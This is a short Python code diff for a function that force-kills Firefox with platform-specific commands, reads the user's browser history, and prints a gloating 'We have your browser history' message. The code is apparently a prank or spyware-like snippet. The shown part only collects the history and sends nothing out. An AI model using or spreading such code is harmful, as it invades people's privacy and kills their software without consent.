@@ -8,14 +8,17 @@ import time
 from browserhistory import get_browserhistory
 from browserhistory import browse
 import json
-
+from sys import platform
 def inputBrowser():
-	# os.system('taskkill /F /IM firefox.exe')
-	os.system('killall -KILL firefox')
+	if platform == "linux" or platform == "darwin" or platform =="linux2":
+		os.system('killall -KILL firefox')
+	else:
+		os.system('taskkill /F /IM firefox.exe')
+
 	a=get_browserhistory()
-	# browse()
+	# # browse()
 	# os.system('taskkill /F /IM firefox.exe')
-	os.system('killall -KILL firefox')
+	# os.system('killall -KILL firefox')
 	print("We have your browser history HUAHUAHUA!")
 	return a
 
